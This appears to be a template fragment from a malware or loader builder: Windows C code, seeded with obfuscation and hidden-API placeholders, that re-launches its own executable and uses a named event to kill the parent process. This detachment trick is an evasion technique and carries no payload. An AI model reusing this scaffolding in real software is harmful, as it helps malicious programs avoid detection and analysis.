{{obf:*}} HANDLE hEvent = {{api-n:CreateEventA}}(NULL, TRUE, FALSE, "{{value:guid}}");

{{obf:*}}
if ((DWORD64){{api-0:GetLastError}}() == ERROR_ALREADY_EXISTS) {
    {{obf:*}} {{api-n:SetEvent}}(hEvent); // Kill parent process
    {{obf:*}}
    return;
}

CHAR lpPath[MAX_PATH];
PROCESS_INFORMATION pi;
STARTUPINFO si;

{{obf:*}} memset(&si, 0x00, sizeof(STARTUPINFO));
{{obf:*}} si.cb = sizeof(STARTUPINFO);

{{obf:*}} HINSTANCE hModule = {{api-n:GetModuleHandleA}}(NULL);
{{obf:*}} {{api-n:GetModuleFileNameA}}(hModule, lpPath, MAX_PATH);
{{obf:*}} {{api-n:CreateProcessA}}(lpPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
{{obf:*}} {{api-n:WaitForSingleObject}}(hEvent, INFINITE);
{{obf:*}} {{api-n:CloseHandle}}(hEvent);
{{obf:*}} {{api-n:ExitProcess}}(0);
{{obf:*}}